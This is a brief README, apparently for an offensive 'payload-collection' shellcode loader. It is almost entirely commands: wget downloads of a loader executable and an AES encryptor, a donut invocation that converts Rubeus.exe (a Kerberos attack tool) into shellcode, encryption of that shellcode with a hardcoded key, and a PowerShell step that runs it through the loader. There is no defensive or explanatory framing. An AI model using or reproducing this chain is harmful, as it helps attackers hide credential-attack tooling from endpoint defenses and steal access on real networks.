# FAST DOWNLOAD
```bash
wget https://github.com/x3by/payload-collection/raw/refs/heads/main/shellcode-loader/scloader.exe
wget https://github.com/x3by/payload-collection/raw/refs/heads/main/shellcode-loader/sc-rawaesenc && chmod +x ./sc-rawaesenc
```

# USAGE

The payload is encoded with AES and the key is 1234567890123456

```bash
donut -i /opt/www/Tools/Rubeus.exe -a 2 -e 3 -p 'createnetonly /program:cmd.exe' && sc-rawaesenc loader.bin && rm loader.bin && mv loader.bin.enc hagrid.bin
```

```powershell
.\scloader.exe .\hagrid.bin
```
